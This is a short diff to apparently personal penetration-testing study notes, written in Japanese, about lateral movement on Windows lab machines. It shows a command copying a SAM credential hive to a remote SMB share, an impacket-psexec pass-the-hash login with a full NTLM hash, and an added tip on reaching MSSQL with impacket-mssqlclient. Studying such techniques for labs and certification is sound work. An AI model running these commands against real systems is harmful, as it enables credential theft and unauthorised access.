@@ -78,3 +78,9 @@ copy C:\Users\THMBackup\sam.hive \\10.13.58.5\public\ \\10.13.58.5\public\
 ```
 impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc tom_admin@10.10.127.140
 ```
+
+11. windows環境でSQLとかを見つけて認証情報も持っていれば、mssqlclientでアクセスできる。  
+evil-winrmやsmbでアクセスできないときに便利。
+```
+impacket-mssqlclient oscp.exam/sql_svc@10.10.157.148 -windows-auth
+```
